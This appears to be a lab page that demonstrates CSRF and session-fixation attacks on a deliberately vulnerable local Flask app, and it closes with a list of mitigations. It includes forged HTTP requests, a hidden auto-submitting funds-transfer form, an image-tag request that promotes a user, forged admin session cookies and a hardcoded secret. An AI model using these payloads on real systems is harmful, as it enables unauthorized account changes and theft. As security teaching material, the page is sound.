<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Simulation</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>CSRF Attack Simulation</h1>
    <p>This page demonstrates how a CSRF attack would work with the vulnerable Flask application.</p>
    
    <h2>Attack 1: Simple CSRF with Forged Token</h2>
    <pre>
POST /admin/delete_user HTTP/1.1
Host: localhost:32768
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgImlzX2FkbWluIjogdHJ1ZX0=.045eb1e3e5640ae6e6c4fae1fefcdc2a68e1b34d9ccb989a1038e28387549f80

csrf_token=JX3tTFRYXJeLmQ7v7Dlscm7oErOzHVVEwKW0FXI+9wE&user_id=2
    </pre>
    
    <h2>Attack 2: HTML Form-Based CSRF</h2>
    <form id="csrf-form" method="POST" action="http://localhost:32768/admin/transfer_funds" style="display:none;">
        <input type="hidden" name="csrf_token" value="JX3tTFRYXJeLmQ7v7Dlscm7oErOzHVVEwKW0FXI+9wE">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="recipient" value="attacker@evil.com">
    </form>
    <script>
        // This would be loaded in victim's browser when they visit attacker's page
        // If victim is already authenticated, the form would be submitted automatically
        // document.getElementById('csrf-form').submit();
    </script>
    
    <h2>Attack 3: Image-Based CSRF</h2>
    <pre>
&lt;img src="http://localhost:32768/admin/promote_user?user_id=attacker&csrf_token=JX3tTFRYXJeLmQ7v7Dlscm7oErOzHVVEwKW0FXI+9wE" /&gt;
    </pre>
    
    <h2>Attack 4: Session Fixation</h2>
    <pre>
1. Attacker generates forged session:
   session=eyJ1c2VyX2lkIjogImF0dGFja2VyIiwgInVzZXJuYW1lIjogImF0dGFja2VyIiwgImlzX2FkbWluIjogdHJ1ZX0=.b28e109b7da048d45aeb3e306ada8e740024827a4e4f5607cf019b09ef8aaa55

2. Attacker tricks victim into visiting:
   http://localhost:32768/?session=ATTACKER_COOKIE

3. Victim uses attacker's session
   
4. Victim logs in - session is NOT regenerated
   
5. Attacker has access to victim's authenticated session
    </pre>
    
    <h2>Vulnerability Details</h2>
    <ul>
        <li><strong>CSRF Token Generation:</strong> Uses hardcoded secret 'your_secret_key'</li>
        <li><strong>Token Validation:</strong> No server-side validation (attacker can forge)</li>
        <li><strong>Session Signing:</strong> Uses same hardcoded secret</li>
        <li><strong>Session Fixation:</strong> No session regeneration after login</li>
        <li><strong>PBKDF2 Salt:</strong> Weak (uses secret key instead of random)</li>
        <li><strong>Serialization:</strong> Potential pickle deserialization RCE if exploited</li>
    </ul>
    
    <h2>Known Values</h2>
    <pre>
Secret Key: your_secret_key
Default Credentials: test:test
PBKDF2 Iterations: 100,000
PBKDF2 Algorithm: SHA256

Sample Forged Admin Session:
eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgImlzX2FkbWluIjogdHJ1ZX0=.045eb1e3e5640ae6e6c4fae1fefcdc2a68e1b34d9ccb989a1038e28387549f80

Sample CSRF Token (timestamp-based):
JX3tTFRYXJeLmQ7v7Dlscm7oErOzHVVEwKW0FXI+9wE
    </pre>
    
    <h2>Mitigation</h2>
    <ol>
        <li>Use cryptographically secure random CSRF tokens (not predictable)</li>
        <li>Store tokens server-side or use properly signed tokens with expiration</li>
        <li>Validate CSRF tokens on all state-changing requests</li>
        <li>Use SameSite=Strict cookie attribute</li>
        <li>Regenerate session ID after login</li>
        <li>Use random salt in PBKDF2 (not the secret key)</li>
        <li>Never hardcode secret keys</li>
        <li>Implement rate limiting on sensitive endpoints</li>
    </ol>
</body>
</html>
